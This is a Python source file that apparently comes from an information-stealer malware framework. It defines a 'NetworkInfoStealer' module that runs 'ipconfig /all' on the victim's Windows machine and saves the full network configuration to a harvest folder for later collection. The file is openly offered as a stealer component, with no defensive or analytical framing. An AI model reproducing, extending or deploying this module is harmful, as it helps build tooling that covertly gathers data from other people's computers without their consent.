import os
import subprocess

from config.manager import ModuleManager


class NetworkInfoStealer(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_name = "NetworkInfoStealer")

        self.systeminfo_folder = os.path.join(self.output_folder_user, 'systeminfo')
        self.ipconfig_filename = os.path.join(self.systeminfo_folder, 'ipconfig.txt')

        if not os.path.isdir(self.systeminfo_folder):
            os.makedirs(self.systeminfo_folder)
            
            
    def run(self) -> None:
        data = subprocess.check_output(['ipconfig', '/all']).decode('utf-8', errors="backslashreplace")
        with open(self.ipconfig_filename, 'w', encoding='utf-8') as _file:
            _file.write(data)
            